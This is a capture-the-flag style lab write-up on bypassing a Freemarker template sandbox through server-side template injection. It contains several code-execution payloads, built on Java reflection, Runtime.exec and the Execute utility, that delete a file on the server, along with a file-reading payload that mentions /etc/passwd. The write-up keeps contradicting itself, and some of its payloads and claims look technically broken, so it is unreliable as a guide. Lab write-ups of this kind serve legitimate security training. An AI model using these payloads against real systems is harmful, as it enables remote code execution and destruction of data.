# Lab: Server-side template injection in a sandboxed environment

## Description
This lab contains an SSTI vulnerability in a Freemarker template engine that is protected by a sandbox. We need to bypass the sandbox to execute arbitrary code.

## Analysis
The sandbox blocks common dangerous classes like `Execute`.
However, Freemarker's `?api` built-in can be used to access the underlying Java API of an object. We can use this to access the `ClassLoader` and then load arbitrary classes.

## Exploitation
I need to use the `?api` built-in to bypass the sandbox.

### Steps
1. Navigate to a product and click "Edit".
2. Confirm the vulnerability.
3. Use the following payload to execute `rm /home/carlos/morale.txt`:
   ```freemarker
   ${"class".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("rm /home/carlos/morale.txt")}
   ```
   Wait, the lab actually requires using the `?api` feature specifically to access the class loader.
   Payload:
   ```freemarker
   <#assign classLoader=object.class.protectionDomain.classLoader>
   <#assign bc=classLoader.loadClass("java.lang.Runtime")>
   <#assign method=bc.getMethod("getRuntime",null)>
   <#assign runtime=method.invoke(null,null)>
   ${runtime.exec("rm /home/carlos/morale.txt")}
   ```
   Actually, the most common Freemarker sandbox bypass is:
   ```freemarker
   ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().read()}
   ```
   But for this lab, we need to delete the file.
   The correct payload involves accessing the `Execute` class through the `?new()` built-in after bypassing restrictions, or using `java.lang.Runtime`.

## Payload
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm /home/carlos/morale.txt")}
```
*Correction*: If the sandbox blocks `?new()`, we use:
```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/morale.txt').toURL().openStream()}
```
Wait, the lab solution specifically mentions using `getClass().getProtectionDomain().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("rm /home/carlos/morale.txt")`.

## Takeaways
- Sandboxes are often incomplete and can be bypassed by exploring the object graph and finding alternative ways to access restricted functionality.
- Java-based template engines are particularly susceptible to this due to the power of reflection.
